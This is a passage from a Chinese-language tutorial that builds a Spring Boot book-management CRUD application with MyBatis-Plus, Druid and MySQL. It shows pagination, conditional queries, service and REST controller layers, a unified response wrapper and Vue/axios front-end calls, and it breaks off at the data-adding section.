<h3 id="数据层开发-CRUD"><a href="#数据层开发-CRUD" class="headerlink" title="数据层开发-CRUD"></a>数据层开发-CRUD</h3><h4 id="1-导入mybatisplus、数据源、mysql驱动的坐标"><a href="#1-导入mybatisplus、数据源、mysql驱动的坐标" class="headerlink" title="(1) 导入mybatisplus、数据源、mysql驱动的坐标"></a>(1) 导入mybatisplus、数据源、mysql驱动的坐标</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h4 id="2-在application-xml中配置数据源信息"><a href="#2-在application-xml中配置数据源信息" class="headerlink" title="(2)在application.xml中配置数据源信息"></a>(2)在application.xml中配置数据源信息</h4><pre><code class="hljs yaml">
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">druid:</span>
      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC</span>
      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span></code></pre>

<p>&#x3D;&#x3D;若连接数据库出现时区错误时可以加上参数?serverTimezone&#x3D;UTC&#x3D;&#x3D;</p>
<h4 id="3-使用MyBatisPlus的标准通用接口BaseMapper加速开发"><a href="#3-使用MyBatisPlus的标准通用接口BaseMapper加速开发" class="headerlink" title="(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发"></a>(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发</h4><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BookDao</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;Book&gt; &#123;
&#125;</code></pre>

<p>&#x3D;&#x3D;注意&#x3D;&#x3D;</p>
<p>对数据库操作时需要指定数据表的前缀，并设置主键增加的策略，这里使用自增</p>
<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>		<span class="hljs-comment">#设置表名通用前缀</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>				<span class="hljs-comment">#设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增</span></code></pre>

<p>设置mybatisPlus的日志显示格式</p>
<p>在进行数据层测试的时候，因为基础的CRUD操作均由MyBatisPlus给我们提供了，所以就出现了一个局面，开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你开发出来的，所以查看执行期运行的SQL语句就成为当务之急。</p>
<p>可以添加日志配置</p>
<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span></code></pre>

<h3 id="数据层开发-分页功能"><a href="#数据层开发-分页功能" class="headerlink" title="数据层开发-分页功能"></a>数据层开发-分页功能</h3><p>Mybatis-plus中已经实现了分页功能的API，具体使用方法如下</p>
<ul>
<li>创建Page对象，利用构造方法实例化所需的参数currentPage，pageSize</li>
<li>使用Mapper.selectPage()使用分页查询功能</li>
</ul>
<pre><code class="hljs java"><span class="hljs-type">IPage</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
<span class="hljs-type">IPage</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> bookDao.selectPage(page, <span class="hljs-literal">null</span>);</code></pre>

<p>使用分页查询返回的结果仍是Page类型，其中包含多条数据，并且使用返回的结果可以获取到分页的详细信息，包括当前页，总记录数，当前页记录数，前一页等</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetPage</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">IPage</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
    bookDao.selectPage(page, <span class="hljs-literal">null</span>);
    System.out.println(page.getCurrent());		<span class="hljs-comment">//当前页码值</span>
    System.out.println(page.getSize());			<span class="hljs-comment">//每页显示数</span>
    System.out.println(page.getTotal());		<span class="hljs-comment">//数据总量</span>
    System.out.println(page.getPages());		<span class="hljs-comment">//总页数</span>
    System.out.println(page.getRecords());		<span class="hljs-comment">//详细数据</span>
&#125;</code></pre>

<p>但是在使用分页功能时需要设置一个拦截器，基础操作中有查询全部的功能，而在这个基础上只需要升级一下（PLUS）就可以得到分页操作。所以MyBatisPlus将分页操作做成了一个开关，你用分页功能就把开关开启，不用就不需要开启这个开关。而我们现在没有开启这个开关，所以分页操作是没有的。这个开关是通过MyBatisPlus的拦截器的形式存在的。</p>
<pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MPConfig</span> &#123;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>());
        
       <span class="hljs-comment">// 当需要其他的拦截器时继续addInnerInterceptor即可</span>
       <span class="hljs-comment">// 如果后期开发其他功能，需要添加全新的拦截器，按照第二行的格式继续add进去新的拦截器就可以了。</span>
        <span class="hljs-keyword">return</span> interceptor;
    &#125;
&#125;</code></pre>



<h3 id="数据层开发-条件查询"><a href="#数据层开发-条件查询" class="headerlink" title="数据层开发-条件查询"></a>数据层开发-条件查询</h3><p>MyBatisPlus将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种条件的拼装。使用方法如下</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetBy</span><span class="hljs-params">()</span>&#123;
    QueryWrapper&lt;Book&gt; qw = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
    qw.like(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Spring&quot;</span>);
    bookDao.selectList(qw);
&#125;</code></pre>

<p>其中第一句QueryWrapper对象是一个用于封装查询条件的对象，该对象可以动态使用API调用的方法添加条件，最终转化成对应的SQL语句。第二句就是一个条件了，需要什么条件，使用QueryWapper对象直接调用对应操作即可。上述代码中执行的SQL语句为<code>select * from tbl_book where name like &#39;%spring%&#39;</code>，MP自动对查询条件进行处理，省去了手动处理的一步。</p>
<p>MyBatisPlus针对字段检查进行了功能升级，全面支持Lambda表达式，就有了下面这组API。由QueryWrapper对象升级为LambdaQueryWrapper对象，其使用方法如下：</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetBy2</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span>;
    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;Book&gt;();
    lqw.like(Book::getName,name);
    bookDao.selectList(lqw);
&#125;</code></pre>

<p>为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MyBatisPlus还提供了动态拼装SQL的快捷书写方式。</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetBy2</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span>;
    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;Book&gt;();
    <span class="hljs-comment">//if(name != null) lqw.like(Book::getName,name);		//方式一：JAVA代码控制</span>
    lqw.like(name != <span class="hljs-literal">null</span>,Book::getName,name);				<span class="hljs-comment">//方式二：API接口提供控制开关</span>
    bookDao.selectList(lqw);
&#125;</code></pre>



<h3 id="业务层开发"><a href="#业务层开发" class="headerlink" title="业务层开发"></a>业务层开发</h3><p>定义业务层的接口<code>BookService</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BookService</span> &#123;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">save</span><span class="hljs-params">(Book book)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Book book)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span>;

    List&lt;Book&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span>;
    Book <span class="hljs-title function_">getById</span><span class="hljs-params">(Integer id)</span>;

    IPage&lt;Book&gt; <span class="hljs-title function_">getPage</span><span class="hljs-params">(<span class="hljs-type">int</span> currentPage, <span class="hljs-type">int</span> pageSize)</span>;

&#125;</code></pre>

<p>业务层接口的实现类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service.impl;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.dao.BookDao;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.BookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">// 注册为数据逻辑层的bean</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BookService</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> BookDao bookDao;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">save</span><span class="hljs-params">(Book book)</span> &#123;
        <span class="hljs-keyword">return</span> bookDao.insert(book) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Book book)</span> &#123;
        <span class="hljs-keyword">return</span> bookDao.updateById(book) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(Integer id)</span> &#123;
        <span class="hljs-keyword">return</span> bookDao.deleteById(id) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> bookDao.selectList(<span class="hljs-literal">null</span>);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Book <span class="hljs-title function_">getById</span><span class="hljs-params">(Integer id)</span> &#123;
        <span class="hljs-keyword">return</span> bookDao.selectById(id);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title function_">getPage</span><span class="hljs-params">(<span class="hljs-type">int</span> currentPage, <span class="hljs-type">int</span> pageSize)</span> &#123;
        IPage&lt;Book&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(currentPage, pageSize);
        <span class="hljs-keyword">return</span> bookDao.selectPage(page, <span class="hljs-literal">null</span>);
    &#125;
&#125;
</code></pre>

<p>使用mybatisplus的自带接口快速开发</p>
<p>业务层接口快速开发</p>
<pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IBookService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IService</span>&lt;Book&gt; &#123;
    <span class="hljs-comment">//添加非通用操作API接口</span>
&#125;</code></pre>

<p>​		业务层接口实现类快速开发，关注继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类。</p>
<pre><code class="hljs JAVA"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ServiceImpl</span>&lt;BookDao, Book&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBookService</span> &#123;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> BookDao bookDao;
	<span class="hljs-comment">//添加非通用操作API</span>
&#125;</code></pre>

<p>​		如果感觉MyBatisPlus提供的功能不足以支撑你的使用需要（其实是一定不能支撑的，因为需求不可能是通用的），在原始接口基础上接着定义新的API接口就行了，此处不再说太多了，就是自定义自己的操作了，但是不要和已有的API接口名冲突即可。</p>
<p><strong>总结</strong></p>
<ol>
<li>使用通用接口（ISerivce<T>）快速开发Service</T></li>
<li>使用通用实现类（ServiceImpl&lt;M,T&gt;）快速开发ServiceImpl</li>
<li>可以在通用接口基础上做功能重载或功能追加</li>
<li>注意重载时不要覆盖原始操作，避免原始提供的功能丢失</li>
</ol>
<h3 id="表现层开发"><a href="#表现层开发" class="headerlink" title="表现层开发"></a>表现层开发</h3><p>表现层接口如下：</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">//使用restful接口约束</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookController2</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IBookService service;

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> service.list();
    &#125;


    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span>&#123;

        System.out.println(book);
        <span class="hljs-keyword">return</span> service.save(book);
    &#125;

    <span class="hljs-meta">@PutMapping</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span>&#123;
        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.eq(Book::getId, book.getId());
        <span class="hljs-keyword">return</span> service.update(book,wrapper);
    &#125;

    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> id)</span>&#123;
        <span class="hljs-keyword">return</span> service.removeById(id);
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> Book <span class="hljs-title function_">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> id )</span>&#123;
        <span class="hljs-keyword">return</span> service.getById(id);
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title function_">getPage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> pageSize)</span>&#123;
        Page&lt;Book&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(currentPage, pageSize);
        <span class="hljs-keyword">return</span> service.page(page);
    &#125;
&#125;</code></pre>

<p>使用postman测试各个接口是否可以正常工作</p>
<p>getById功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231257883.png" alt="image-20220418231257883"></p>
<p>分页功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231337888.png" alt="image-20220418231337888"></p>
<p>save()功能</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231557326.png" alt="image-20220418231557326"></p>
<p>删除功能delete()</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418232140801.png" alt="image-20220418232140801"></p>
<p>&#x3D;&#x3D;消息一致性处理&#x3D;&#x3D; </p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">R</span> &#123;
    <span class="hljs-keyword">private</span> Boolean flag;   <span class="hljs-comment">//表示本次请求是否成功</span>
    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">//本次请求返回的数据</span>
&#125;</code></pre>

<p>使用消息一致处理后获取的数据格式</p>
<pre><code class="hljs java">&#123;
    <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;data&quot;</span>:&#123;
        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;计算机理论&quot;</span>,
        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Spring实战 第5版&quot;</span>,
        <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;Spring入门经典教程&quot;</span>
    &#125;
&#125;</code></pre>

<p>修改表现层代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;


<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.controller.utils.R;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IBookService service;

    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> R <span class="hljs-title function_">getAll</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> pageSize, Book book)</span>&#123;
        IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book);
        <span class="hljs-keyword">if</span>(currentPage &gt; bookIPage.getPages()) &#123;
            bookIPage = service.getAll((<span class="hljs-type">int</span>) bookIPage.getPages(), pageSize, book);
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(<span class="hljs-literal">null</span> != bookIPage, bookIPage);
    &#125;


    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> R <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(service.save(book));
    &#125;

    <span class="hljs-meta">@PutMapping</span>
    <span class="hljs-keyword">public</span> R <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span>&#123;
        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.eq(Book::getId, book.getId());
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(service.update(book,wrapper));
    &#125;

    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> R <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> id)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(service.removeById(id));
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> R <span class="hljs-title function_">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-type">int</span> id )</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(<span class="hljs-literal">true</span>, service.getById(id));
    &#125;

<span class="hljs-comment">//    @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
<span class="hljs-comment">//    public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123;</span>
<span class="hljs-comment">//        Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize);</span>
<span class="hljs-comment">//        Page&lt;Book&gt; page = service.page(ipage);</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//        if(currentPage &gt; page.getCurrent())&#123;</span>
<span class="hljs-comment">//            ipage.setCurrent(page.getPages());</span>
<span class="hljs-comment">//            page = service.page(ipage);</span>
<span class="hljs-comment">//        &#125;</span>
<span class="hljs-comment">//        return new R(true, page);</span>
<span class="hljs-comment">//    &#125;</span>
&#125;
</code></pre>

<h3 id="前端页面代码"><a href="#前端页面代码" class="headerlink" title="前端页面代码"></a>前端页面代码</h3><h4 id="分页查询所有数据和条件查询"><a href="#分页查询所有数据和条件查询" class="headerlink" title="分页查询所有数据和条件查询"></a>分页查询所有数据和条件查询</h4><p>页面数据模型定义</p>
<pre><code class="hljs java">data:&#123;
	dataList: [],              <span class="hljs-comment">//当前页要展示的列表数据</span>
	pagination: &#123;              <span class="hljs-comment">//分页相关模型数据</span>
                currentPage: <span class="hljs-number">1</span>,<span class="hljs-comment">//当前页码</span>
                pageSize:<span class="hljs-number">10</span>,   <span class="hljs-comment">//每页显示的记录数</span>
                total:<span class="hljs-number">0</span>,       <span class="hljs-comment">//总记录数</span>
                name:<span class="hljs-string">&#x27;&#x27;</span>,
                type:<span class="hljs-string">&#x27;&#x27;</span>,
                description:<span class="hljs-string">&#x27;&#x27;</span>
    &#125;
&#125;</code></pre>

<p>异步请求代码</p>
<pre><code class="hljs js"><span class="hljs-title function_">getAll</span>(<span class="hljs-params"></span>) &#123;
    param = <span class="hljs-string">&quot;?name=&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">name</span>;
    param = param + <span class="hljs-string">&quot;&amp;type=&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">type</span>;
    param = param + <span class="hljs-string">&quot;&amp;description=&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">description</span>;

    <span class="hljs-comment">// console.log(param);</span>
    axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/books/&quot;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">currentPage</span> + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">pageSize</span> + param).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataList</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">records</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">total</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">total</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">currentPage</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">current</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">pagesize</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">size</span>;
    &#125;);
&#125;</code></pre>

<p>在钩子函数中执行该方法</p>
<pre><code class="hljs java"><span class="hljs-comment">//钩子函数，VUE对象初始化完成后自动执行</span>
created() &#123;
    <span class="hljs-built_in">this</span>.getAll();
&#125;,</code></pre>

<h4 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h4><p>添加数据的窗口弹出控制</p>
<p>数据模型</p>
